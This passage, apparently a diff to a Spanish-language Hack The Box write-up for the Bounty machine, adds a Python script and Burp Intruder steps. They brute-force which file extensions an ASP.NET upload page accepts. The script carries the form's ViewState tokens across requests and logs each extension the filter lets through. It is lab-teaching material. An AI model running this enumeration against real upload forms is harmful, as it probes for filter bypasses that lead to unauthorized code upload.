@@ -29,18 +29,96 @@ Siempre que tenemos este tipo de cosas hay que probar que extenciones permiten l
 > http://10.129.18.176/UploadedFiles
 
 
+## Python (probando extenciones que acepta)
+
+Para probar extenciones se uso el script de s4vitar.
+
+```python
+
+#!/usr/bin/python3
+
+from pwn import *
+import signal, time, pdb, sys, requests, re
+
+# Diccionario A Utilizar
+# /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt
+
+transfer_url='http://10.129.137.104/transfer.aspx'
+
+def def_handler(sig, frame):
+	print("\n\n[!] Saliendo....\n")
+	sys.exit(1)
+
+#CTRL+ C
+signal.signal(signal.SIGINT, def_handler)
+#time.sleep(10)
+
+burp = { 'http': 'http://127.0.0.1:8080'}
+
+def uploadFile(extension):
+	# Vamos a arrastrar sesiones
+	#r = requests.get(transfer_url)
+	s = requests.session()
+	r = s.get(transfer_url)
+	#pdb.set_trace()
+	viewState = re.findall(r'id="__VIEWSTATE" value="(.*?)"',r.text)[0]
+	#print(viewState)
+	#pdb.set_trace()
+	eventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"',r.text)[0]
+	#print(eventValidation)
+	post_data = {
+	'__VIEWSTATE': viewState,
+	'__EVENTVALIDATION': eventValidation,
+	'btnUpload': 'Upload'
+	}
+	fileUploaded = {'FileUpload1': ('Prueba%s' % extension, 'Esto es una prueba')}
+	r = s.post(transfer_url,data=post_data,files= fileUploaded) # proxies=burp
+	#print(r.text)
+	if "Invalid File. Please try again"  not in r.text:
+		#print ("La Extencion es correcta")
+		log.info("La extension %s valida " % extension)
 
 
 
 
+if __name__ == '__main__':
+	f = open("/usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt", "rb")
+
+	p1 = log.progress("Fuerza bruta")
+	p1.status("Iniciando ataque de fuerza bruta")
+
+	time.sleep(2)
+
+	for extension in f.readlines():
+		#pdb.set_trace()
+		extension= extension.decode().strip()
+		p1.status("Probando con la extension %s" % extension)
+		uploadFile(extension)
 
 
+```
+
+![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/1c58bea9-bc86-456c-9c6e-eb1277585549)
 
 
+## Burpsuite
+
+Se pueden probar las extenciones validas con el intruder.
+
+![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/0dae7f01-379a-43f8-973c-29fce098dab0)
+
+Agregamos ahi en donde esta la extencion y nos vamos a payloads.
+
+![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/c5088d8c-fe65-4b72-8480-69a6ffde08aa)
 
 
+Al lanzarlo tenemos un problema lo esta URL encodeando necesitamos arreglar eso o no funciona.
 
+![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/ba912ed8-fa64-4bba-ba6e-6bbd1dd4aa02)
 
+Quitamos esa opcion. Si queremos que nos saque una frase cosa que veo ya inecesario solo fijate en el length
+
+![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/c85ba7ee-5e0c-4567-9eb0-7a704f16e08e)
 
 
 
